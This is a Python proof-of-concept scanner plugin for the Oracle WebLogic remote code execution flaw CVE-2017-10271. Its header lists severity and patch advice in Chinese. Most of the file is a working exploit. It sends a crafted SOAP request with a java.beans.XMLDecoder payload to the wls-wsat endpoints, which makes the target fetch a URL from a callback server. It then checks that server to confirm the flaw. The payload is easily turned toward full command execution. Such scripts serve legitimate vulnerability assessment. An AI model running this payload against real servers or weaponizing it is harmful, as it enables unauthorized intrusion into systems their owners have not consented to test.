#!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
    name: WebLogic WLS RCE CVE-2017-10271
    info:Oracle WebLogic Server WLS安全组件中的缺陷导致远程命令执行
    level: 高危
    type: 命令执行
    repair: 临时解决：删除所有的wls-wsat.war文件和wls-wsat文件夹，并清空所有tmp目录
            补丁解决：weblogic 2017年10月补丁
'''
import urllib2,time
from POC_Framework import POC

class myPOC(POC):
    
    #单IP的POC
    def check(self, ip, port, timeout=5):
        test_str = self.random_str(6)
        server_ip = self.get_self_ip(ip)
        check_url = ['/wls-wsat/CoordinatorPortType','/wls-wsat/CoordinatorPortType11']

        heads = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'SOAPAction': "",
            'Content-Type': 'text/xml;charset=UTF-8',
            }

        post_str = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java version="1.8" class="java.beans.XMLDecoder">
                    <void class="java.net.URL">
                    <string>http://%s:8088/add/%s</string>
                    <void method="openStream"/>
                    </void>
                </java>
                </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body/>
            </soapenv:Envelope>
                    ''' % (server_ip, test_str)
        for url in check_url:
            target_url = 'http://'+ip+':'+str(port)+url.strip()
            req = urllib2.Request(url=target_url, headers=heads)
            try:
                Web_Services = urllib2.urlopen(req, timeout=timeout).read()
            except:
                continue
            if 'Web Services' in Web_Services:
                req = urllib2.Request(url=target_url, data=post_str, headers=heads)
                try:
                    urllib2.urlopen(req, timeout=15).read()
                except:
                    pass
                time.sleep(2)
                check_result = urllib2.urlopen("http://%s:8088/check/%s" %(server_ip, test_str), timeout=timeout).read()
                if "YES" in check_result:
                    return True
            else:
                pass

if __name__ == "__main__":

    Check_POC = myPOC()
    Check_POC.run()